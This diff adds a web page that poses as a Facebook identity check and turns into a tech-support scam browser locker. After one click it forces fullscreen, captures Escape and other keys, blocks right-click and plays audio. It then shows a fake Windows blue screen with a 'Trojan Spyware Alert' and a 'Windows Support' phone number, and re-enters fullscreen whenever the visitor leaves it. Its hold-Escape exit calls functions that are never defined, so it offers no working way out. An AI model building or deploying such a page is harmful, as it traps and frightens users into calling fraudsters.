@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows Diagnostic</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{--blue:#0078D4;--bg:#0a0a0f;--card:#13131a;--accent:#3b82f6;--glow:rgba(59,130,246,0.35);--txt:#f0f0f0;--muted:rgba(240,240,240,0.45);--fb:#1877F2;--fb-dark:#166fe5;--fb-bg:#F0F2F5;}
+html,body{width:100%;height:100%;overflow:hidden;font-family:'Segoe UI',Arial,sans-serif;background:var(--bg);}
+
+#entry{position:fixed;inset:0;z-index:5;display:flex;align-items:center;justify-content:center;background:url('https://www.webmarketing-conseil.fr/wp-content/uploads/2014/03/facebook-interface-1024x683.png') center/cover no-repeat;transition:opacity 0.5s ease;}
+#entry::before{content:'';position:absolute;inset:0;background:linear-gradient(160deg,rgba(24,119,242,0.5) 0%,rgba(0,0,0,0.4) 100%);}
+
+.card{position:relative;z-index:1;width:400px;background:#fff;border:none;border-radius:8px;padding:0;box-shadow:0 2px 20px rgba(0,0,0,0.45);animation:cardIn 0.4s ease both;overflow:hidden;}
+@keyframes cardIn{from{opacity:0;transform:translateY(16px) scale(0.98);}to{opacity:1;transform:none;}}
+
+.card-header{background:var(--fb);padding:22px 24px 18px;text-align:center;}
+.card-header h1{font-size:22px;font-weight:700;color:#fff;letter-spacing:-0.3px;line-height:1.3;margin:0;}
+.card-header p.sub{font-size:13px;color:rgba(255,255,255,0.82);margin-top:6px;line-height:1.5;}
+.card-body{padding:20px 24px 24px;background:#fff;}
+.info-box{background:#f0f2f5;border:1px solid #dddfe2;border-radius:6px;padding:13px 14px;margin-bottom:18px;font-size:12.5px;color:#444;line-height:1.7;}
+.info-box strong{color:#1c1e21;font-weight:600;}
+.btn{width:100%;padding:11px;background:var(--fb);color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;transition:background 0.15s,transform 0.1s;}
+.btn:hover{background:var(--fb-dark);}
+.btn:active{transform:scale(0.99);}
+.divider{border:none;border-top:1px solid #dddfe2;margin:16px 0;}
+.note{font-size:12px;color:#606770;text-align:center;line-height:1.5;}
+
+/* ── BSOD ── */
+#bsod{
+  position:fixed;inset:0;z-index:10;
+  background:#0078D4;
+  color:#fff;
+  font-family:'Segoe UI',Arial,sans-serif;
+  display:none;overflow:hidden;
+  cursor:none;user-select:none;-webkit-user-select:none;
+}
+/* scanline overlay */
+#bsod::before{content:'';position:absolute;inset:0;z-index:2;background:repeating-linear-gradient(0deg,transparent 0,transparent 3px,rgba(0,0,0,0.04) 3px,rgba(0,0,0,0.04) 4px);pointer-events:none;}
+/* vignette */
+#bsod::after{content:'';position:absolute;inset:0;z-index:2;background:radial-gradient(ellipse 120% 120% at 50% 50%,transparent 55%,rgba(0,0,20,0.25) 100%);pointer-events:none;}
+
+/* Windows logo — top right */
+.bwin-logo{
+  position:absolute;top:7vh;right:7vw;z-index:3;
+  width:clamp(80px,9vw,130px);height:clamp(80px,9vw,130px);
+  opacity:0;transition:opacity 0.5s ease 0.4s;
+  display:grid;grid-template-columns:1fr 1fr;gap:6px;
+}
+.bwin-logo.v{opacity:1;}
+.bwin-logo span{background:#fff;display:block;border-radius:1px;}
+
+/* main content wrapper */
+.bwrap{
+  position:relative;z-index:3;
+  padding:7vh 8vw;
+  display:flex;flex-direction:column;
+  height:100%;
+}
+
+/* sad face */
+.bface{
+  font-size:clamp(60px,8vw,100px);
+  font-weight:300;line-height:1;
+  margin-bottom:clamp(16px,2.5vh,32px);
+  opacity:0;transition:opacity 0.4s ease;
+}
+.bface.v{opacity:1;}
+
+/* headline */
+.bh1{
+  font-size:clamp(18px,2.2vw,28px);
+  font-weight:400;line-height:1.35;
+  margin-bottom:clamp(10px,1.8vh,22px);
+  max-width:640px;
+  opacity:0;transform:translateY(6px);
+  transition:opacity 0.5s ease,transform 0.5s ease;
+}
+.bh1.v{opacity:1;transform:none;}
+
+/* phone line */
+.bphone{
+  font-size:clamp(22px,3vw,38px);
+  font-weight:700;
+  letter-spacing:0.5px;
+  margin-bottom:clamp(16px,2.5vh,30px);
+  opacity:0;transition:opacity 0.5s ease 0.05s;
+}
+.bphone.v{opacity:1;}
+
+/* progress */
+.pct-lbl{font-size:15px;margin-bottom:10px;font-variant-numeric:tabular-nums;}
+.bar-track{width:220px;height:4px;background:rgba(255,255,255,0.25);border-radius:2px;overflow:hidden;}
+.bar-fill{height:100%;width:0%;background:#fff;border-radius:2px;transition:width 0.1s linear;}
+.prog{opacity:0;transition:opacity 0.4s ease 0.2s;}
+.prog.v{opacity:1;}
+
+/* bottom section: QR left + stop info right */
+.bbot{
+  position:absolute;bottom:10vh;left:8vw;right:8vw;z-index:3;
+  display:flex;align-items:flex-end;gap:4vw;
+  opacity:0;transition:opacity 0.5s ease 0.3s;
+}
+.bbot.v{opacity:1;}
+
+/* QR box */
+.bqr-wrap{flex-shrink:0;}
+.bqr-wrap svg{display:block;}
+
+/* stop info text */
+.bstop-txt{
+  font-size:clamp(11px,1.2vw,13px);
+  line-height:1.9;
+  color:rgba(255,255,255,0.88);
+}
+.bstop-txt a{color:#fff;}
+
+/* glitch on headline */
+@keyframes g1{0%,100%{clip-path:inset(0 0 98% 0);transform:translate(-2px,0);}20%{clip-path:inset(15% 0 75% 0);transform:translate(2px,0);}40%{clip-path:inset(50% 0 30% 0);transform:translate(-1px,0);}60%{clip-path:inset(80% 0 5% 0);transform:translate(3px,0);}80%{clip-path:inset(25% 0 65% 0);transform:translate(-2px,0);}}
+@keyframes g2{0%,100%{clip-path:inset(90% 0 2% 0);transform:translate(2px,0);opacity:.5;}33%{clip-path:inset(40% 0 50% 0);transform:translate(-2px,0);opacity:.4;}66%{clip-path:inset(10% 0 80% 0);transform:translate(1px,0);opacity:.6;}}
+.gh{position:relative;display:inline;}
+.gh::before,.gh::after{content:attr(data-t);position:absolute;inset:0;pointer-events:none;color:#fff;font-size:inherit;font-weight:inherit;}
+.gh::before{color:#ff006644;animation:g1 5s steps(1) infinite;}
+.gh::after{color:#00fff544;animation:g2 5s steps(1) infinite 0.7s;}
+
+@keyframes bsodIn{0%{opacity:0;}8%{opacity:1;}10%{opacity:.4;}12%{opacity:1;}15%{opacity:.7;}17%{opacity:1;}}
+@keyframes bsodOut{0%{opacity:1;filter:brightness(1);}40%{opacity:.3;filter:brightness(2.5);}100%{opacity:0;filter:brightness(4) blur(6px);}}
+@keyframes flicker{0%,95%,100%{opacity:1;}96%{opacity:.85;}97%{opacity:1;}98.5%{opacity:.9;}}
+
+/* ESC ring */
+#esc-dock{position:fixed;bottom:5vh;right:6vw;z-index:30;display:none;flex-direction:column;align-items:center;gap:8px;pointer-events:none;}
+#esc-dock.on{display:flex;}
+.ring-wrap{position:relative;width:64px;height:64px;}
+.ring-wrap svg{position:absolute;top:0;left:0;transform:rotate(-90deg);}
+#ea-bg{fill:none;stroke:rgba(255,255,255,0.15);stroke-width:4;}
+#ea{fill:none;stroke:#fff;stroke-width:4;stroke-linecap:round;stroke-dasharray:175.93;stroke-dashoffset:175.93;transition:stroke-dashoffset 0.05s linear;}
+.ring-mid{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:rgba(255,255,255,0.9);}
+.esc-lbl{font-size:11px;color:rgba(255,255,255,0.45);letter-spacing:0.06em;text-align:center;white-space:nowrap;}
+
+#wall{position:fixed;inset:0;z-index:4;background:#000000;display:none;}
+#wall.on{display:block;}
+</style>
+</head>
+<body>
+
+<!-- Entry card (Facebook login prompt) -->
+<div id="entry">
+  <div class="card">
+    <div class="card-header">
+      <h1>FaceBook</h1>
+    </div>
+    <div class="card-body">
+      <div class="info-box">
+        <strong>Please click continue to verify your identity.</strong><br>
+      </div>
+      <button class="btn" id="go-btn">Continue</button>
+      <hr class="divider">
+    </div>
+  </div>
+</div>
+
+<!-- BSOD screen -->
+<div id="bsod">
+
+  <!-- Windows logo top-right -->
+  <div class="bwin-logo" id="bwin-logo">
+    <span></span><span></span>
+    <span></span><span></span>
+  </div>
+
+  <div class="bwrap">
+    <!-- Sad face -->
+    <div class="bface" id="bface">:(</div>
+
+    <!-- Headline -->
+    <div class="bh1" id="bh1">
+      <span class="gh" data-t="Trojan Spyware Alert - error code: #00ecs778x9">Trojan Spyware Alert - error code: #00ecs778x9</span><br>
+      access to this pc has been block
+    </div>
+
+    <!-- Phone number -->
+    <div class="bphone" id="bphone">
+      Contact Windows Support &nbsp; +1 718-814-0421
+    </div>
+
+    <!-- Progress bar -->
+    <div class="prog" id="prog">
+      <div class="pct-lbl" id="pct">0% complete</div>
+      <div class="bar-track"><div class="bar-fill" id="bar"></div></div>
+    </div>
+  </div>
+
+  <!-- Bottom: QR + stop info -->
+  <div class="bbot" id="bstop">
+    <!-- QR code (SVG replica matching image style) -->
+    <div class="bqr-wrap">
+      <svg width="110" height="110" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+        <rect width="120" height="120" fill="#fff"/>
+        <g fill="#000">
+          <!-- top-left finder -->
+          <rect x="6" y="6" width="32" height="32"/><rect x="10" y="10" width="24" height="24" fill="#fff"/><rect x="14" y="14" width="16" height="16"/>
+          <!-- top-right finder -->
+          <rect x="82" y="6" width="32" height="32"/><rect x="86" y="10" width="24" height="24" fill="#fff"/><rect x="90" y="14" width="16" height="16"/>
+          <!-- bottom-left finder -->
+          <rect x="6" y="82" width="32" height="32"/><rect x="10" y="86" width="24" height="24" fill="#fff"/><rect x="14" y="90" width="16" height="16"/>
+          <!-- timing + data modules -->
+          <rect x="46" y="6" width="6" height="6"/><rect x="58" y="6" width="6" height="6"/><rect x="70" y="6" width="6" height="6"/>
+          <rect x="46" y="18" width="6" height="6"/><rect x="70" y="18" width="6" height="6"/><rect x="58" y="30" width="6" height="6"/>
+          <rect x="46" y="46" width="6" height="6"/><rect x="58" y="46" width="6" height="6"/><rect x="70" y="46" width="6" height="6"/><rect x="82" y="46" width="6" height="6" fill="#0078D4"/>
+          <rect x="46" y="58" width="6" height="6"/><rect x="70" y="58" width="6" height="6"/>
+          <rect x="46" y="70" width="6" height="6"/><rect x="58" y="70" width="6" height="6"/><rect x="82" y="70" width="6" height="6" fill="#0078D4"/>
+          <rect x="58" y="82" width="6" height="6"/><rect x="70" y="82" width="6" height="6"/><rect x="82" y="82" width="6" height="6" fill="#0078D4"/>
+          <rect x="46" y="94" width="6" height="6"/><rect x="82" y="94" width="6" height="6" fill="#0078D4"/>
+          <rect x="46" y="106" width="6" height="6"/><rect x="58" y="106" width="6" height="6"/><rect x="70" y="106" width="6" height="6"/><rect x="82" y="106" width="6" height="6" fill="#0078D4"/>
+          <rect x="46" y="118" width="6" height="6"/><rect x="70" y="118" width="6" height="6"/>
+        </g>
+      </svg>
+    </div>
+
+    <!-- Stop info text -->
+    <div class="bstop-txt">
+      For more information about this issue and possible fixes, visit<br>
+      <a href="#">https://www.windows.com/stopcode</a><br>
+      If you call a support person, give them this info:<br>
+      <strong>Stop Code: CRITICAL_PROCESS_DIED</strong>
+    </div>
+  </div>
+
+</div>
+
+<!-- ESC hold-to-exit dock -->
+<div id="esc-dock">
+  <div class="ring-wrap">
+    <svg width="64" height="64" viewBox="0 0 64 64">
+      <circle id="ea-bg" cx="32" cy="32" r="28"/>
+      <circle id="ea" cx="32" cy="32" r="28"/>
+    </svg>
+    <div class="ring-mid" id="rlbl"></div>
+  </div>
+  <div class="esc-lbl" id="etxt"></div>
+</div>
+
+<div id="wall"></div>
+
+<audio id="bg-audio" src="audio.mp3" loop preload="auto"></audio>
+
+<script>
+(function(){
+
+  var HOLD_MS  = 12000;
+  var CIRC     = 2 * Math.PI * 28;
+  var BAR_STEP = 100;
+
+  var entry   = document.getElementById('entry');
+  var bsodEl  = document.getElementById('bsod');
+  var dock    = document.getElementById('esc-dock');
+  var ea      = document.getElementById('ea');
+  var rlbl    = document.getElementById('rlbl');
+  var etxt    = document.getElementById('etxt');
+  var pctEl   = document.getElementById('pct');
+  var barEl   = document.getElementById('bar');
+  var wall    = document.getElementById('wall');
+  var audio   = document.getElementById('bg-audio');
+
+  var sim     = false;
+  var okExit  = false;
+  var holdSt  = null;
+  var rafId   = null;
+  var barIv   = null;
+  var fsRetry = null;
+
+  ea.style.strokeDasharray  = CIRC;
+  ea.style.strokeDashoffset = CIRC;
+
+  function lockKeyboard(){
+    if(navigator.keyboard && navigator.keyboard.lock){
+      navigator.keyboard.lock(['Escape']).then(function(){
+        console.log('Keyboard lock active — ESC fully captured');
+      }).catch(function(e){
+        console.log('Keyboard lock failed (needs HTTPS or user gesture):', e);
+      });
+    }
+  }
+
+  function unlockKeyboard(){
+    if(navigator.keyboard && navigator.keyboard.unlock){
+      navigator.keyboard.unlock();
+    }
+  }
+
+  function reqFS(cb){
+    var el = document.documentElement;
+    var fn = el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||el.msRequestFullscreen;
+    if(!fn){if(cb)cb();return;}
+    try{
+      var p = fn.call(el);
+      if(p&&p.then){
+        p.then(function(){if(cb)cb();}).catch(function(){if(cb)cb();});
+      }else{
+        setTimeout(function(){if(cb)cb();},100);
+      }
+    }catch(e){if(cb)cb();}
+  }
+
+  function exitFS(){
+    var fn=document.exitFullscreen||document.webkitExitFullscreen||document.mozCancelFullScreen||document.msExitFullscreen;
+    if(fn)try{fn.call(document);}catch(e){}
+  }
+
+  function isFS(){
+    return !!(document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement);
+  }
+
+  var fsObserver = new MutationObserver(function(mutations){
+    if(!sim || okExit) return;
+    if(!isFS()) immediateRelock();
+  });
+
+  var docObserver = new MutationObserver(function(){
+    if(!sim || okExit) return;
+    if(!isFS()) immediateRelock();
+  });
+
+  function startObservers(){
+    fsObserver.observe(document.documentElement, {attributes:true,attributeOldValue:true,subtree:false});
+    docObserver.observe(document.documentElement, {attributes:true,childList:false,subtree:false});
+  }
+
+  function stopObservers(){
+    fsObserver.disconnect();
+    docObserver.disconnect();
+  }
+
+  var resizeObs = new ResizeObserver(function(){
+    if(!sim || okExit) return;
+    if(!isFS()) immediateRelock();
+  });
+
+  var relockScheduled = false;
+
+  function immediateRelock(){
+    if(okExit || !sim) return;
+    if(isFS()) return;
+    wall.classList.add('on');
+    if(relockScheduled) return;
+    relockScheduled = true;
+    if(typeof queueMicrotask === 'function'){
+      queueMicrotask(function(){ doRelock(); });
+    } else {
+      Promise.resolve().then(function(){ doRelock(); });
+    }
+  }
+
+  function doRelock(){
+    relockScheduled = false;
+    if(okExit || !sim){ wall.classList.remove('on'); return; }
+    if(isFS()){ wall.classList.remove('on'); return; }
+    reqFS(function(){
+      requestAnimationFrame(function(){
+        requestAnimationFrame(function(){
+          wall.classList.remove('on');
+          lockKeyboard();
+        });
+      });
+    });
+  }
+
+  ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange'].forEach(function(ev){
+    document.addEventListener(ev, function(){
+      if(sim && !okExit && !isFS()) immediateRelock();
+    }, true);
+  });
+
+  setInterval(function(){
+    if(sim && !okExit && !isFS()) immediateRelock();
+  }, 100);
+
+  window.addEventListener('focus', function(){
+    if(sim && !okExit && !isFS()) immediateRelock();
+  });
+
+  document.addEventListener('visibilitychange', function(){
+    if(sim && !okExit && document.visibilityState==='visible' && !isFS()) immediateRelock();
+  });
+
+  document.getElementById('go-btn').addEventListener('click', function(){
+    audio.currentTime = 0;
+    audio.play().catch(function(){});
+    reqFS(function(){
+      lockKeyboard();
+      startObservers();
+      resizeObs.observe(document.body);
+      startSim();
+    });
+  });
+
+  function rv(id, ms){
+    setTimeout(function(){var e=document.getElementById(id);if(e)e.classList.add('v');}, ms);
+  }
+
+  function startSim(){
+    sim = true; okExit = false;
+    entry.style.opacity = '0';
+    entry.style.pointerEvents = 'none';
+    setTimeout(function(){entry.style.display='none';}, 500);
+    bsodEl.style.display = 'block';
+    bsodEl.style.animation = 'bsodIn 0.55s ease forwards, flicker 8s ease infinite 5s';
+    dock.classList.add('on');
+    rv('bface',350); rv('bh1',750); rv('bphone',1000);
+    rv('prog',1450); rv('bwin-logo',650); rv('bstop',1900);
+    setTimeout(startBar, 1600);
+  }
+
+  function startBar(){
+    var p=0;
+    barIv = setInterval(function(){
+      p++; pctEl.textContent=p+'% complete'; barEl.style.width=p+'%';
+      if(p>=100) clearInterval(barIv);
+    }, BAR_STEP);
+  }
+
+  document.addEventListener('keydown', function(e){
+    if(!sim) return;
+    e.preventDefault();
+    e.stopImmediatePropagation();
+    if(e.key==='Escape' && !e.repeat){
+      if(!holdSt){ holdSt=Date.now(); rafId=requestAnimationFrame(tick); }
+    }
+  }, true);
+
+  document.addEventListener('keyup', function(e){
+    if(!sim) return;
+    e.preventDefault();
+    e.stopImmediatePropagation();
+    if(e.key==='Escape') resetRing();
+  }, true);
+
+  document.addEventListener('contextmenu', function(e){if(sim)e.preventDefault();}, true);
+
+  
+
+  function doExit(){
+    okExit=true; sim=false;
+    relockScheduled=false;
+    audio.pause();
+    audio.currentTime = 0;
+    wall.classList.remove('on');
+    unlockKeyboard();
+    stopObservers();
+    resizeObs.disconnect();
+    clearTimeout(fsRetry);
+    if(isFS()) exitFS();
+    bsodEl.style.animation='bsodOut 0.65s ease forwards';
+    clearInterval(barIv);
+    setTimeout(function(){
+      bsodEl.style.display='none';
+      bsodEl.style.animation='';
+      dock.classList.remove('on');
+      ['bface','bh1','bphone','prog','bwin-logo','bstop'].forEach(function(id){
+        var e=document.getElementById(id); if(e) e.classList.remove('v');
+      });
+      barEl.style.width='0%'; pctEl.textContent='0% complete';
+      entry.style.display='flex'; entry.style.pointerEvents='';
+      requestAnimationFrame(function(){
+        entry.style.opacity='1';
+        setTimeout(function(){ okExit=false; relockScheduled=false; }, 100);
+      });
+    }, 750);
+  }
+
+})();
+</script>
+</body>
+</html>
